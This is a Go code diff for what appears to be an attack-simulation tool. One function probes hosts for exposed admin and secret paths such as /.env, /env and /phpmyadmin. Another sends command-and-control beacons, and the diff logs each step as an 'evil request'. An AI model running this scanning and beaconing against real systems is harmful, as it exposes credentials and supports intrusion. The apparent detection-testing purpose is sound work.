@@ -43,16 +43,44 @@ var adminEndpoints = []string{
 	"/console",
 	"/actuator",
 	"/metrics",
+	"/api",
+	"/api/v1",
+	"/api/v2",
+	"/swagger",
+	"/swagger-ui",
+	"/swagger-ui.html",
+	"/graphql",
+	"/graphiql",
+	"/debug",
+	"/status",
+	"/health",
+	"/info",
+	"/env",
+	"/config",
+	"/prometheus",
+	"/monitoring",
+	"/jenkins",
+	"/phpmyadmin",
+	"/adminer",
+	"/server-status",
+	"/.env",
+	"/login",
 }
 
 func probeService(url string) {
+	client := &http.Client{
+		Timeout: 10 * time.Second,
+	}
+
 	for _, endpoint := range adminEndpoints {
 		fullURL := fmt.Sprintf("http://%s%s", url, endpoint)
-		resp, err := http.Get(fullURL)
+		resp, err := client.Get(fullURL)
 		if err != nil {
+			log.Printf("evil request failed to %s: %v", fullURL, err)
 			continue
 		}
 		defer resp.Body.Close()
+		log.Printf("evil request succeeded to %s", fullURL)
 
 		// Store interesting responses (non 404s)
 		if resp.StatusCode != 404 {
@@ -107,11 +135,17 @@ func sendC2Beacon(endpoint string) {
 		return
 	}
 
-	// Send POST request
-	_, err = http.Post(endpoint, "application/json", bytes.NewReader(jsonPayload))
-	if err != nil {
-		log.Printf("Failed to send C2 beacon: %v", err)
+	client := &http.Client{
+		Timeout: 10 * time.Second,
 	}
+
+	// Send POST request
+	_, err = client.Post(endpoint, "application/json", bytes.NewReader(jsonPayload))
+	if err != nil {
+		log.Printf("evil request failed to C2 endpoint %s: %v", endpoint, err)
+		return
+	}
+	log.Printf("evil request succeeded to C2 endpoint %s", endpoint)
 }
 
 func main() {
